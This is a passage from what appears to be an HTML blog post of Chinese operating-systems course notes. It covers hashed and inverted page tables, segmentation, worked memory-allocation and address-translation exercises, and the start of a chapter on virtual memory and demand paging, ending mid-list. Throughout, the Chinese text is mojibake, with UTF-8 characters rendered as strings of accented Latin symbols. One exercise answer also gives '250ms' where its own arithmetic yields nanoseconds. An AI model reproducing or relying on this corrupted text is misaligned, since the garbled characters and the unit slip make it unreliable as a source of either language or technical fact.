å°„çš„å¸§å·ï¼Œ</p><p>ï¼ˆ3ï¼‰æŒ‡å‘é“¾è¡¨ä¸­ä¸‹ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚</p><p>è¯¥ç®—æ³•æŒ‰å¦‚ä¸‹æ–¹å¼å·¥ä½œï¼š è™šæ‹Ÿåœ°å€ä¸­çš„è™šæ‹Ÿé¡µå·è½¬æ¢åˆ°å“ˆå¸Œè¡¨ä¸­ï¼Œ ç”¨è™šæ‹Ÿé¡µå·ä¸é“¾è¡¨ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ çš„ç¬¬ä¸€ä¸ªåŸŸç›¸æ¯”è¾ƒã€‚å¦‚æœåŒ¹é…ï¼Œé‚£ä¹ˆ ç›¸åº”çš„å¸§å·ï¼ˆç¬¬äºŒä¸ªåŸŸï¼‰å°±ç”¨æ¥å½¢æˆç‰©ç†åœ°å€ï¼šå¦‚æœä¸åŒ¹é…ï¼Œé‚£ä¹ˆå°±å¯¹é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œä»¥å¯»æ‰¾ä¸€ä¸ªåŒ¹é…çš„é¡µå·ã€‚<br>è¯¥æ–¹æ¡ˆå¦‚å›¾ 8.16 æ‰€ç¤º</p><p><img src="/posts/8ce3e425/image-20220110172339613.png" alt="image-20220110172339613"></p><h3 id="853-åå‘é¡µè¡¨"><a class="markdownIt-Anchor" href="#853-åå‘é¡µè¡¨"></a> 8.5.3 åå‘é¡µè¡¨</h3><p>åå‘é¡µè¡¨å¯¹äºæ¯ä¸ªçœŸæ­£çš„å†…å­˜é¡µæˆ–å¸§æ‰æœ‰ä¸€ä¸ªæ¡ç›®ã€‚ æ¯ä¸ªæ¡ç›®åŒ…å«ä¿å­˜åœ¨çœŸæ­£å†…å­˜ä½ç½®çš„é¡µçš„è™šæ‹Ÿåœ°å€ä»¥åŠæ‹¥æœ‰è¯¥é¡µçš„è¿›ç¨‹çš„ä¿¡æ¯ã€‚ å› æ­¤ï¼Œ æ•´ä¸ªç³»ç»Ÿåªæœ‰ä¸€ä¸ªé¡µè¡¨ï¼Œ å¯¹æ¯ä¸ªç‰©ç†å†…å­˜çš„é¡µåªæœ‰ä¸€æ¡ç›¸åº”çš„æ¡ç›®ã€‚</p><p><img src="/posts/8ce3e425/image-20220110172931237.png" alt="image-20220110172931237"></p><h2 id="86-åˆ†æ®µ"><a class="markdownIt-Anchor" href="#86-åˆ†æ®µ"></a> 8.6 åˆ†æ®µ</h2><h3 id="861-åŸºæœ¬æ–¹æ³•"><a class="markdownIt-Anchor" href="#861-åŸºæœ¬æ–¹æ³•"></a> 8.6.1 åŸºæœ¬æ–¹æ³•</h3><p>åˆ†æ®µï¼ˆsegmentationï¼‰å°±æ˜¯æ”¯æŒè¿™ç§ç”¨æˆ·è§†è§’çš„å†…å­˜ç®¡ç†æ–¹æ¡ˆã€‚ é€»è¾‘åœ°å€ç©ºé—´æ˜¯ç”±ä¸€ç»„æ®µç»„æˆçš„ã€‚ æ¯ä¸ªæ®µéƒ½æœ‰åç§°å’Œé•¿åº¦ã€‚ åœ°å€æŒ‡å®šäº†æ®µåç§°å’Œæ®µå†…åç§»ã€‚ å› æ­¤ç”¨æˆ·é€šè¿‡ä¸¤ä¸ªé‡æ¥æŒ‡å®šåœ°å€ï¼šæ®µåç§°å’Œåç§»ï¼ˆè¯·å°†è¿™ä¸€æ–¹æ¡ˆä¸åˆ†é¡µç›¸æ¯”è¾ƒã€‚åœ¨åˆ†é¡µä¸­ï¼Œç”¨æˆ·åªæŒ‡å®šä¸€ä¸ªåœ°å€ï¼Œ<br>è¯¥åœ°å€é€šè¿‡ç¡¬ä»¶åˆ†ä¸ºé¡µç å’Œåç§»ï¼Œå¯¹äºè¿™äº›ï¼Œç¨‹åºå‘˜æ˜¯çœ‹ä¸è§çš„ï¼‰</p><h3 id="862-ç¡¬ä»¶"><a class="markdownIt-Anchor" href="#862-ç¡¬ä»¶"></a> 8.6.2 ç¡¬ä»¶</h3><p>æ®µè¡¨çš„ä½¿ç”¨å¦‚å›¾ 8.19 æ‰€ç¤ºã€‚ ä¸€ä¸ªé€»è¾‘åœ°å€ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š æ®µå·så’Œæ®µå†…çš„åç§»dã€‚æ®µå·ç”¨åšæ®µè¡¨çš„ç´¢å¼•ï¼Œ é€»è¾‘åœ°å€çš„åç§»dåº”ä½äº0å’Œæ®µç•Œé™ä¹‹é—´ã€‚</p><p><img src="/posts/8ce3e425/image-20220110174321311.png" alt="image-20220110174321311"></p><p><img src="/posts/8ce3e425/image-20220110174328309.png" alt="image-20220110174328309"></p><p><strong>åˆ†æ®µå¼ä¸åˆ†é¡µå¼çš„åŒºåˆ«</strong></p><ul><li><ol><li>å¯è§ä¸ä¸å¯è§</li></ol><ul><li>â€œåˆ†é¡µâ€æ˜¯ç³»ç»Ÿæ´»åŠ¨ï¼Œç”¨æˆ·æ— æ³•ä»‹å…¥ï¼Œé¡µçš„å¤§å°å›ºå®š</li><li>â€œåˆ†æ®µâ€æ˜¯ç”¨æˆ·å¯è§çš„ï¼Œæ®µå¤§å°å¯å˜</li></ul></li><li><ol start="2"><li>ç‰©ç†å•ä½ä¸é€»è¾‘å•ä½</li></ol><ul><li>é¡µæ˜¯ä¿¡æ¯çš„ç‰©ç†å•ä½ï¼Œä¸æ˜¯å®Œæ•´çš„é€»è¾‘å•ä½</li><li>æ®µæ˜¯å®Œæ•´çš„é€»è¾‘ä¿¡æ¯å•ä½</li></ul></li><li><ol start="3"><li>åœ°å€ç©ºé—´</li></ol><ul><li>åˆ†é¡µçš„ä½œä¸šç©ºé—´æ˜¯ä¸€ç»´çš„ï¼Œæ˜¯å•ä¸€çº¿æ€§ç©ºé—´</li><li>åˆ†æ®µçš„ä½œä¸šç©ºé—´æ˜¯äºŒç»´çš„ã€‚</li></ul></li></ul><h3 id="863-æ®µé¡µå¼å­˜å‚¨ç®¡ç†"><a class="markdownIt-Anchor" href="#863-æ®µé¡µå¼å­˜å‚¨ç®¡ç†"></a> 8.6.3 æ®µé¡µå¼å­˜å‚¨ç®¡ç†</h3><p><strong>å¼•å…¥</strong></p><p>åˆ†é¡µç®¡ç†å†…å­˜ç®¡ç†æ•ˆç‡é«˜</p><ul><li>æ²¡æœ‰å¤–é›¶å¤´</li><li>å†…é›¶å¤´å°</li></ul><p>åˆ†æ®µç®¡ç†ç¬¦åˆæ¨¡å—åŒ–æ€æƒ³</p><ul><li>æ¯ä¸ªåˆ†æ®µéƒ½å…·å¤‡å®Œæ•´çš„åŠŸèƒ½</li><li>æ–¹ä¾¿ä»£ç å…±äº«ã€ä¿æŠ¤</li></ul><p><strong>æ®µé¡µå¼ç®¡ç†çš„åŸºæœ¬æ€æƒ³</strong></p><ul><li>ç”¨æˆ·ç¨‹åºåˆ†æ®µã€æ®µå†…åˆ†é¡µ</li><li>ç³»ç»Ÿå†…å­˜åˆ†å—</li><li>æ¯å—è£…å…¥ä¸€é¡µï¼Œå„å—ä¹‹é—´å¯ä»¥ä¸è¿ç»­</li><li>ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼ï¼ˆæ®µåï¼Œæ®µå†…åœ°å€ï¼‰ï¼ï¼ˆæ®µåï¼Œæ®µå†…é¡µå·+é¡µå†…åœ°å€ï¼‰</li></ul><p><img src="/posts/8ce3e425/image-20220110175110374.png" alt="image-20220110175110374"></p><h2 id="88-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#88-ä¹ é¢˜"></a> 8.8 ä¹ é¢˜</h2><h3 id="81"><a class="markdownIt-Anchor" href="#81"></a> 8.1</h3><blockquote><p>è¯•è¯´æ˜å†…éƒ¨ç¢ç‰‡ä¸å¤–éƒ¨ç¢ç‰‡çš„åŒºåˆ«ï¼ŒåŠè§£å†³æ–¹æ³•</p></blockquote><p>å†…éƒ¨ç¢ç‰‡æ˜¯æŸä¸€åŒºåŸŸæˆ–æŸä¸€é¡µä¸­æœªè¢«å æ®å…¶ä½ç½®çš„ä½œä¸šæ‰€ä½¿ç”¨çš„åŒºåŸŸã€‚ç›´åˆ°ä½œä¸šå®Œæˆï¼Œ é‡Šæ”¾é¡µæˆ–åŒºåŸŸ ï¼Œ è¿™ä¸ªç©ºé—´æ‰èƒ½è¢«ç³»ç»Ÿæ‰€åˆ©ç”¨ã€‚å†…éƒ¨ç¢ç‰‡ä¸€èˆ¬æ— æ³•é¿å…</p><p>å¤–éƒ¨ç¢ç‰‡éšç€è¿›ç¨‹è£…å…¥å’Œç§»å‡ºå†…å­˜ï¼Œ ç©ºé—²å†…å­˜ç©ºé—´è¢«åˆ†ä¸ºå°ç‰‡æ®µã€‚ å½“æ‰€æœ‰æ€»çš„å¯ç”¨å†…å­˜ä¹‹å’Œå¯ä»¥æ»¡è¶³è¯·æ±‚ï¼Œ ä½†å¹¶ä¸è¿ç»­æ—¶ï¼Œ è¿™å°±å‡ºç°äº†å¤–éƒ¨ç¢ç‰‡é—®é¢˜ã€‚å¤–éƒ¨ç¢ç‰‡å¯é€šè¿‡ç´§ç¼©æ¥å‡å°‘ï¼Œå³å°†ç©ºé—²å†…å­˜åˆå¹¶æˆå¤§å†…å­˜ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å…è®¸ç‰©ç†åœ°å€ç©ºé—´ä¸ºéè¿ç»­æ¥é¿å…ï¼Œ è¿™æ ·åªè¦æœ‰ç‰©ç†å†…å­˜å°±å¯ä¸ºè¿›ç¨‹åˆ†é…</p><h3 id="83"><a class="markdownIt-Anchor" href="#83"></a> 8.3</h3><blockquote><p>å¦‚æœæœ‰å†…å­˜å—100KBã€500KBã€200KBã€300KBå’Œ600KB CæŒ‰é¡ºåºã€‰ï¼Œé¦–æ¬¡é€‚åº”ç®—æ³•ã€ æœ€ä½³é€‚åº”ç®—æ³•ã€ æœ€å·®é€‚åº”ç®—æ³•å„è‡ªå°†æ€æ ·æ”¾ç½®å¤§å°åˆ†åˆ«ä¸º212KBã€417KBã€112KBå’Œ426KBï¼ˆæŒ‰é¡ºåºï¼‰çš„è¿›ç¨‹ï¼Ÿå“ªä¸€ç§ç®—æ³•çš„å†…å­˜åˆ©ç”¨ç‡æœ€é«˜ï¼Ÿ</p></blockquote><p>æœ€å…ˆé€‚åº”ï¼š</p><ul><li>212KBè¢«æ”¾å…¥500KBå†…å­˜éƒ¨åˆ†</li><li>417KBè¢«æ”¾å…¥600KBå†…å­˜éƒ¨åˆ†</li><li>112KBè¢«æ”¾å…¥288KB(500KB-212KB)å†…å­˜éƒ¨åˆ†</li><li>426KBzéœ€è¦ç­‰å¾…</li></ul><p>æœ€ä½³é€‚åº”ï¼š</p><ul><li>212KBè¢«æ”¾å…¥300KBå†…å­˜éƒ¨åˆ†</li><li>417KBè¢«æ”¾å…¥500KBå†…å­˜éƒ¨åˆ†</li><li>112KBè¢«æ”¾å…¥200KBå†…å­˜éƒ¨åˆ†</li><li>426KBè¢«æ”¾å…¥600KBå†…å­˜éƒ¨åˆ†</li></ul><p>æœ€å·®é€‚åº”ï¼š</p><ul><li>212KBè¢«å†…å­˜600KBæ”¾å…¥éƒ¨åˆ†</li><li>417KBè¢«æ”¾å…¥500KBå†…å­˜éƒ¨åˆ†</li><li>112KBè¢«æ”¾å…¥388KBå†…å­˜éƒ¨åˆ†</li><li>426KBéœ€è¦ç­‰å¾…</li></ul><p>æœ€ä½³é€‚åº”ç®—æ³•çš„å†…å­˜åˆ©ç”¨ç‡æœ€é«˜</p><h3 id="84"><a class="markdownIt-Anchor" href="#84"></a> 8.4</h3><blockquote><p>ç»å¤§å¤šæ•°ç³»ç»Ÿå…è®¸ç¨‹åºåœ¨æ‰§è¡Œæ—¶åˆ†é…æ›´å¤šçš„å†…å­˜ç»™å®ƒè‡ªå·±çš„åœ°å€ç©ºé—´ã€‚ ç¨‹åºçš„å †æ®µä¸­çš„æ•°æ®åˆ†é…å°±æ˜¯è¿™æ ·ä¸€ä¸ªå†…å­˜åˆ†é…å®ä¾‹ã€‚ åœ¨ä¸‹é¢çš„æ–¹æ³•ä¸­ï¼Œæ”¯æŒåŠ¨æ€å†…å­˜åˆ†é…éœ€è¦ä»€ä¹ˆï¼Ÿ</p><p>a.è¿ç»­å†…å­˜åˆ†é…</p><p>b.çº¯åˆ†æ®µ</p><p>c.çº¯åˆ†é¡µ</p></blockquote><p>a.è¿ç»­å†…å­˜åˆ†é…ï¼šå½“æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ç»™ç¨‹åºå»æ‰©å¤§å®ƒå·²åˆ†é…çš„å†…å­˜ç©ºé—´æ—¶ï¼Œå°†è¦æ±‚é‡æ–°åˆ†é…æ•´ä¸ªç¨‹åºã€‚<br>b.çº¯æ®µå¼åˆ†é…ï¼šå½“æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ç»™æ®µå»æ‰©å¤§å®ƒçš„å·±åˆ†é…å†…å­˜ç©ºå›æ—¶ï¼Œå°†è¦æ±‚é‡æ–°åˆ†é…æ•´ä¸ªæ®µã€‚<br>c.çº¯é¡µå¼åˆ†é…ï¼šåœ¨æ²¡æœ‰è¦æ±‚ç¨‹åºåœ°å€ç©ºé—´å†åˆ†é…çš„æ–¹æ¡ˆä¸‹ï¼Œæ–°é¡µå¢åŠ çš„åˆ†é…æ˜¯å¯èƒ½çš„ã€‚</p><h3 id="85"><a class="markdownIt-Anchor" href="#85"></a> 8.5</h3><blockquote><p>å¯¹ä¸‹åˆ—é—®é¢˜ï¼Œè¯•æ¯”è¾ƒè¿ç»­å†…å­˜åˆ†é…æ–¹æ¡ˆã€çº¯åˆ†æ®µæ–¹æ¡ˆå’Œçº¯åˆ†é¡µæ–¹æ¡ˆä¸­çš„å†…å­˜ç»„ç»‡æ–¹æ³•<br>a.å¤–éƒ¨ç¢ç‰‡<br>b.å†…éƒ¨ç¢ç‰‡<br>c.å…±äº«è·¨è¿›ç¨‹ä»£ç çš„èƒ½åŠ›</p></blockquote><p>è¿ç»­å†…å­˜åˆ†é…æ–¹æ¡ˆ</p><ul><li>ä¼šå—åˆ°å¤–éƒ¨ç¢ç‰‡çš„å½±å“ï¼Œå› ä¸ºåœ°å€ç©ºé—´æ˜¯è¿ç»­åˆ†é…çš„ï¼Œéšç€æ—§è¿›ç¨‹çš„æ¶ˆäº¡å’Œæ–°è¿›ç¨‹çš„å¯åŠ¨ï¼Œä¼šå‡ºç°ç©ºæ´ã€‚</li><li>å®ƒè¿˜ä¸å…è®¸è¿›ç¨‹å…±äº«ä»£ç ï¼Œå› ä¸ºè¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜æ®µä¸ä¼šè¢«åˆ†è§£æˆä¸è¿ç»­çš„ç»†ç²’åº¦æ®µã€‚</li></ul><p>çº¯åˆ†æ®µ</p><ul><li>ä¹Ÿä¼šå—åˆ°å¤–éƒ¨ç¢ç‰‡çš„å½±å“ï¼Œå› ä¸ºè¿›ç¨‹çš„ä¸€æ®µè¢«è¿ç»­åœ°å¸ƒç½®åœ¨ç‰©ç†å†…å­˜ä¸­ï¼Œè€Œå½“æ­»è¿›ç¨‹çš„æ®µè¢«æ–°è¿›ç¨‹çš„æ®µæ›¿æ¢æ—¶ï¼Œå°†ä¼šå‘ç”Ÿç¢ç‰‡ã€‚</li><li>ç„¶è€Œï¼Œåˆ†æ®µä½¿è¿›ç¨‹èƒ½å¤Ÿå…±äº«ä»£ç ï¼Œä¾‹å¦‚ï¼Œä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹å¯ä»¥å…±äº«ä¸€ä¸ªä»£ç æ®µï¼Œä½†å…·æœ‰ä¸åŒçš„æ•°æ®æ®µã€‚</li></ul><p>çº¯åˆ†é¡µ</p><ul><li>ä¸ä¼šå—åˆ°å¤–éƒ¨ç¢ç‰‡çš„å½±å“ï¼Œè€Œæ˜¯ä¼šå—åˆ°å†…éƒ¨ç¢ç‰‡çš„å½±å“ã€‚è¿›ç¨‹æ˜¯æŒ‰é¡µé¢ç²’åº¦åˆ†é…çš„ï¼Œå¦‚æœé¡µé¢æ²¡æœ‰å¾—åˆ°å……åˆ†åˆ©ç”¨ï¼Œå°±ä¼šå¯¼è‡´å†…éƒ¨ç¢ç‰‡å’Œç›¸åº”çš„ç©ºé—´æµªè´¹ã€‚</li><li>åˆ†é¡µè¿˜ä½¿è¿›ç¨‹èƒ½å¤Ÿåœ¨åˆ†é¡µçš„ç²’åº¦ä¸Šå…±äº«ä»£ç ã€‚</li></ul><h3 id="89"><a class="markdownIt-Anchor" href="#89"></a> 8.9</h3><blockquote><p>8.9 å‡è®¾ä¸€ä¸ªå°†é¡µè¡¨å­˜æ”¾åœ¨å†…å­˜çš„åˆ†é¡µç³»ç»Ÿï¼š<br>a. å¦‚æœä¸€æ¬¡å†…å­˜è®¿é—®éœ€ 200nsï¼Œ è®¿é—®ä¸€é¡µå†…å­˜è¦ç”¨å¤šé•¿é—´ï¼Ÿ<br>b. å¦‚æœåŠ å…¥TLBï¼Œå¹¶ä¸”75%çš„é¡µè¡¨å¼•ç”¨å‘ç”Ÿåœ¨TLBï¼Œå†…å­˜æœ‰æ•ˆè®¿é—®æ—¶é—´æ˜¯å¤šå°‘ï¼Ÿï¼ˆå‡è®¾åœ¨TLBä¸­æŸ¥æ‰¾é¡µè¡¨é¡¹å ç”¨é›¶æ—¶é—´ï¼Œ å¦‚æœé¡µè¡¨é¡¹åœ¨å…¶ä¸­ã€‚)</p></blockquote><p>aï¼šéœ€è¦400ns,ç”¨200nsè®¿é—®å†…å­˜é¡µè¡¨ï¼Œå†ç”¨200nsè¿›å…¥å†…å­˜ä¸­çš„å­—</p><p>bï¼šæœ‰æ•ˆæŸ¥è¯¢æ—¶é—´=0.75*200ns+0.25*400ns=250ms</p><h3 id="810"><a class="markdownIt-Anchor" href="#810"></a> 8.10</h3><blockquote><p>ä¸ºä»€ä¹ˆæ—¶å¸¸å°†åˆ†é¡µä¸åˆ†æ®µåœ¨åŒä¸€ä¸ªæ–¹æ¡ˆä¸­ç»“åˆä½¿ç”¨ï¼Ÿ</p></blockquote><p>åˆ†æ®µå’Œåˆ†é¡µé€šå¸¸ç»“åˆåœ¨ä¸€èµ·ï¼Œä»¥ä¾¿ç›¸äº’æ”¹è¿›ã€‚</p><p>å½“é¡µè¡¨å˜å¾—éå¸¸å¤§æ—¶ï¼Œåˆ†æ®µéå¸¸æœ‰ç”¨ã€‚é¡µè¡¨ä¸­æœªä½¿ç”¨çš„è¾ƒå¤§è¿ç»­éƒ¨åˆ†å¯ä»¥æŠ˜å æˆé¡µè¡¨åœ°å€ä¸ºé›¶çš„å•ä¸ªæ®µè¡¨æ¡ç›®ã€‚åˆ†é¡µåˆ†æ®µå¤„ç†éœ€è¦å¤§é‡æ—¶é—´è¿›è¡Œåˆ†é…çš„å¾ˆé•¿åˆ†æ®µçš„æƒ…å†µã€‚é€šè¿‡åˆ†é¡µåˆ†æ®µï¼Œæˆ‘ä»¬å‡å°‘äº†ç”±äºå¤–éƒ¨ç¢ç‰‡é€ æˆçš„å†…å­˜æµªè´¹ï¼ŒåŒæ—¶ç®€åŒ–äº†åˆ†é…</p><h3 id="811"><a class="markdownIt-Anchor" href="#811"></a> 8.11</h3><blockquote><p>è¯•è¯´æ˜ä¸ºä»€ä¹ˆä½¿ç”¨åˆ†æ®µæ¯”ä½¿ç”¨çº¯åˆ†é¡µæ›´å®¹æ˜“å…±äº«ä¸€ä¸ªå¯é‡å…¥æ¨¡å—ã€‚</p></blockquote><h3 id="812"><a class="markdownIt-Anchor" href="#812"></a> 8.12</h3><blockquote><p>å‡è®¾æœ‰ä¸‹é¢çš„æ®µè¡¨</p><p><img src="/posts/8ce3e425/image-20211223170751628.png" alt="image-20211223170751628"></p><p>ä¸‹é¢é€»è¾‘åœ°å€çš„ç‰©ç†åœ°å€æ˜¯å¤šå°‘ï¼Ÿ</p><p>a. 0430<br>b. 110<br>c. 2500<br>d. 3400<br>e. 4122</p></blockquote><p>æ ¹æ®é€»è¾‘åœ°å€åˆ†ç¦»å‡ºæ®µå·å’Œæ®µå†…åç§»ï¼Œé¦–å…ˆéœ€è¦æ ¹æ®æ®µé•¿åº¦åˆ¤æ–­åœ°å€æ˜¯å¦åˆæ³•</p><p>a=430+219=649</p><p>b=10+2300=2310</p><p>c:æ®µåç§»500&gt;æ®µé•¿åº¦100ï¼Œè¶Šç•Œï¼Œåœ°å€ä¸åˆæ³•</p><p>d=400+1327=1727</p><p>e:æ®µåç§»122&gt;æ®µé•¿åº¦96,è¶Šç•Œï¼Œä¸åˆæ³•</p><h3 id="813"><a class="markdownIt-Anchor" href="#813"></a> 8.13</h3><blockquote><p>é¡µè¡¨åˆ†é¡µçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</p></blockquote><p>åˆ†é¡µï¼ˆpagingï¼‰å†…å­˜ç®¡ç†æ–¹æ¡ˆå…è®¸è¿›ç¨‹çš„ç‰©ç†åœ°å€ç©ºé—´å¯ä»¥æ˜¯éè¿ç»­çš„ã€‚ åˆ†é¡µé¿å…äº†å°†ä¸åŒå¤§å°çš„å†…å­˜å—åŒ¹é…åˆ°äº¤æ¢ç©ºé—´ä¸Šè¿™æ ·çš„éº»çƒ¦ã€‚</p><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåˆ†é¡µçš„é¡µè¡¨å¯ä»¥å˜å¾—è¶³å¤Ÿå¤§ ï¼Œå¯ä»¥ç®€åŒ–å†…å­˜åˆ†é…é—®é¢˜ï¼ˆç¡®ä¿å…¨éƒ¨å¯ä»¥åˆ†é…å›ºå®šå¤§å°çš„é¡µ ï¼Œ è€Œä¸æ˜¯å¯å˜å¤§å°çš„å—ï¼‰ç¡®ä¿å½“å‰æœªä½¿ç”¨çš„éƒ¨åˆ†é¡µè¡¨å¯ä»¥äº¤æ¢ ã€‚</p><h1 id="ç¬¬9ç« -è™šæ‹Ÿå†…å­˜"><a class="markdownIt-Anchor" href="#ç¬¬9ç« -è™šæ‹Ÿå†…å­˜"></a> ç¬¬9ç«  è™šæ‹Ÿå†…å­˜</h1><h2 id="91-èƒŒæ™¯"><a class="markdownIt-Anchor" href="#91-èƒŒæ™¯"></a> 9.1 èƒŒæ™¯</h2><p>è™šæ‹Ÿå†…å­˜ï¼ˆvirtual memoryï¼‰å°†ç”¨æˆ·é€»è¾‘å†…å­˜ä¸ç‰©ç†å†…å­˜åˆ†å¼€ã€‚è¿™åœ¨ç°æœ‰ç‰©ç†å†…å­˜æœ‰é™çš„æƒ…å†µä¸‹ï¼Œ ä¸ºç¨‹åºå‘˜æä¾›äº†å·¨å¤§çš„è™šæ‹Ÿå†…å­˜ ã€‚ è™šæ‹Ÿå†…å­˜ä½¿ç¼–ç¨‹æ›´åŠ å®¹æ˜“ï¼Œ å› ä¸ºç¨‹åºå‘˜ä¸å†éœ€è¦æ‹…å¿ƒå¯ç”¨çš„æœ‰é™ç‰©ç†å†…å­˜ç©ºé—´ï¼Œ åªéœ€è¦å…³æ³¨æ‰€è¦è§£å†³çš„é—®é¢˜ã€‚</p><p><img src="/posts/8ce3e425/image-20220101142011629.png" alt="image-20220101142011629"></p><p>é™¤äº†å°†é€»è¾‘å†…å­˜ä¸ç‰©ç†å†…å­˜åˆ†å¼€ï¼Œ è™šæ‹Ÿå†…å­˜ä¹Ÿå…è®¸æ–‡ä»¶å’Œå†…å­˜é€šè¿‡å…±äº«é¡µè€Œä¸ºä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹æ‰€å…±äº«ï¼ˆè§ 8.4.4 å°èŠ‚ï¼‰ã€‚ è¿™å¸¦æ¥äº†å¦‚ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>é€šè¿‡å°†å…±äº«å¯¹è±¡æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œ ç³»ç»Ÿåº“å¯ä¸ºå¤šä¸ªè¿›ç¨‹æ‰€å…±äº«ã€‚ è™½ç„¶æ¯ä¸ªè¿›ç¨‹éƒ½è®¤ä¸ºå…±äº«åº“æ˜¯å…¶è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œ è€Œå…±äº«åº“æ‰€ç”¨çš„ç‰©ç†å†…å­˜çš„å®é™…é¡µæ˜¯ä¸ºæ‰€æœ‰è¿›ç¨‹æ‰€å…±äº«ã€‚</li><li>ç±»ä¼¼åœ°ï¼Œ è™šæ‹Ÿå†…å­˜å…è®¸è¿›ç¨‹å…±äº«å†…å­˜ã€‚ å¦‚ç¬¬3ç« æ‰€è¿°ï¼Œ ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ä½¿ç”¨å…±äº«å†…å­˜æ¥é€šä¿¡ã€‚è™šæ‹Ÿå†…å­˜å…è®¸ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºå†…å­˜åŒºåŸŸï¼Œä»¥ä¾¿ä¸å…¶ä»–è¿›ç¨‹è¿›è¡Œå…±äº«ã€‚å…±äº«è¯¥å†…å­˜åŒºåŸŸçš„è¿›ç¨‹è®¤ä¸ºå®ƒæ˜¯å…¶è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œ è€Œäº‹å®ä¸Šè¿™éƒ¨åˆ†æ˜¯å…±äº«çš„ï¼Œ å¦‚å›¾ 9.3 æ‰€ç¤ºã€‚</li><li>è™šæ‹Ÿå†…å­˜å¯å…è®¸åœ¨ç”¨ç³»ç»Ÿè°ƒç”¨fork()åˆ›å»ºè¿›ç¨‹æœŸé—´å…±äº«é¡µï¼Œ ä»è€ŒåŠ å¿«è¿›ç¨‹åˆ›å»ºã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220101142401380.png" alt="image-20220101142401380"></p><h2 id="92-æŒ‰éœ€è°ƒé¡µ"><a class="markdownIt-Anchor" href="#92-æŒ‰éœ€è°ƒé¡µ"></a> 9.2 æŒ‰éœ€è°ƒé¡µ</h2><p>**æŒ‰éœ€è°ƒé¡µï¼ˆ**demand pagingï¼‰:</p><p>æ˜¯åœ¨éœ€è¦æ—¶æ‰è°ƒå…¥ç›¸åº”çš„é¡µã€‚ è¿™ç§æŠ€æœ¯å¸¸ä¸ºè™šæ‹Ÿå†…å­˜ç³»ç»Ÿæ‰€é‡‡ç”¨ã€‚ å¯¹äºæŒ‰éœ€è°ƒé¡µè™šæ‹Ÿå†…å­˜ï¼Œåªæœ‰ç¨‹åºæ‰§è¡Œéœ€è¦æ—¶æ‰è½½å…¥é¡µï¼Œé‚£äº›ä»æœªè®¿é—®çš„é¡µä¸ä¼šè°ƒå…¥åˆ°ç‰©ç†å†…å­˜ã€‚</p><h3 id="921-åŸºæœ¬æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#921-åŸºæœ¬æ¦‚å¿µ"></a> 9.2.1 åŸºæœ¬æ¦‚å¿µ</h3><p>å½“æ¢å…¥è¿›ç¨‹æ—¶ï¼Œè°ƒé¡µç¨‹åºæ¨æµ‹åœ¨è¯¥è¿›ç¨‹å†æ¬¡æ¢å‡ºä¹‹å‰ä¼šç”¨åˆ°å“ªäº›é¡µã€‚è°ƒé¡µç¨‹åºä¸æ˜¯è°ƒå…¥æ•´ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯æŠŠé‚£äº›å¿…éœ€çš„é¡µè°ƒå…¥å†…å­˜ã€‚è¿™æ ·ï¼Œ è°ƒé¡µç¨‹åºå°±é¿å…äº†è¯»å…¥é‚£äº›ä¸ä½¿ç”¨çš„é¡µï¼Œä¹Ÿå‡å°‘äº†å˜æ¢æ—¶é—´å’Œæ‰€éœ€çš„ç‰©ç†å†…å­˜ç©ºé—´ã€‚</p><p>éœ€è¦è®¾ç½®é¡µè¡¨æ¡ç›®çš„<strong>æœ‰æ•ˆ-æ— æ•ˆä½</strong>æ¥åŒºåˆ†å“ªäº›é¡µåœ¨å†…å­˜é‡Œã€‚</p><p><img src="/posts/8ce3e425/image-20220103132620930.png" alt="image-20220103132620930"></p><p>å¯¹æ ‡è®°ä¸ºæ— æ•ˆçš„è®¿é—®ä¼šäº§ç”Ÿ<strong>é¡µé”™è¯¯é™·é˜±</strong>ï¼ˆpage-fault trapï¼‰ã€‚ åˆ†é¡µç¡¬ä»¶ï¼Œåœ¨é€šè¿‡é¡µè¡¨è½¬æ¢åœ°å€æ—¶ï¼Œå°†å‘ç°å·±è®¾ç½®äº†æ— æ•ˆä½ï¼Œä¼šé™·å…¥æ“ä½œç³»ç»Ÿã€‚</p><p><strong>å¤„ç†è¿™ç§é¡µé”™è¯¯çš„ç¨‹åºçš„æµç¨‹ï¼š</strong></p><ul><li>â‘ æ£€æŸ¥è¿›ç¨‹çš„å†…éƒ¨é¡µè¡¨ï¼ˆé€šå¸¸ä¸PCBä¸€èµ·ä¿å­˜ï¼‰ï¼Œä»¥ç¡®å®šè¯¥å¼•ç”¨æ˜¯åˆæ³•è¿˜æ˜¯éæ³•çš„åœ°å€è®¿é—®ã€‚</li><li>â‘¡å¦‚æœå¼•ç”¨éæ³•ï¼Œé‚£ä¹ˆç»ˆæ­¢è¿›ç¨‹ã€‚ å¦‚æœå¼•ç”¨æœ‰æ•ˆä½†æ˜¯å°šæœªè°ƒå…¥é¡µé¢ï¼Œ é‚£ä¹ˆç°åœ¨åº”è°ƒå…¥ã€‚</li><li>â‘¢æ‰¾åˆ°ä¸€ä¸ªç©ºé—²å¸§ 